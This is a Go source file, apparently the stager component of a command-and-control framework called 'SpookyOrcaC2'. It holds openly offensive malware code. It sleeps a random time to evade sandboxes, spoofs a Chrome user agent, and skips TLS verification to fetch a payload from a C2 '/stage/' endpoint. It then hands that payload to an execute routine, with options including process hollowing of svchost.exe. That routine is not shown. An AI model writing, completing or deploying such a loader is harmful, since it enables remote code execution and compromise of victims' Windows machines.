package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"strconv"
	"time"
)

// Baked in via -ldflags "-X main.c2URL=... -X main.stageToken=... ..."
var (
	c2URL       = "http://127.0.0.1:8080" // C2 base URL (no trailing slash)
	stageToken  = ""                       // Stage token
	encKey      = "SpookyOrcaC2AES1"      // AES key (SHA-256 derived)
	execMethod  = "thread"                 // thread | hollow | drop
	hollowExe   = `C:\Windows\System32\svchost.exe`
	jitterSleep = "0"  // extra random sleep (seconds) before execution — sandbox delay
	userAgent   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)

func main() {
	// Optional sandbox-evasion sleep before doing anything
	if j, err := strconv.Atoi(jitterSleep); err == nil && j > 0 {
		rng := rand.New(rand.NewSource(time.Now().UnixNano()))
		wait := time.Duration(j+rng.Intn(j+1)) * time.Second
		time.Sleep(wait)
	}

	url := c2URL + "/stage/" + stageToken
	// Server decrypts before serving — received bytes are ready-to-execute plaintext.
	payload, err := download(url)
	if err != nil {
		os.Exit(1)
	}
	if len(payload) == 0 {
		os.Exit(1)
	}

	if err := execute(payload); err != nil {
		os.Exit(1)
	}
}

// download fetches the encrypted payload from the C2 stage endpoint.
func download(url string) ([]byte, error) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{
		Timeout:   60 * time.Second,
		Transport: tr,
	}

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", userAgent)

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("stage server returned %d", resp.StatusCode)
	}

	return io.ReadAll(resp.Body)
}

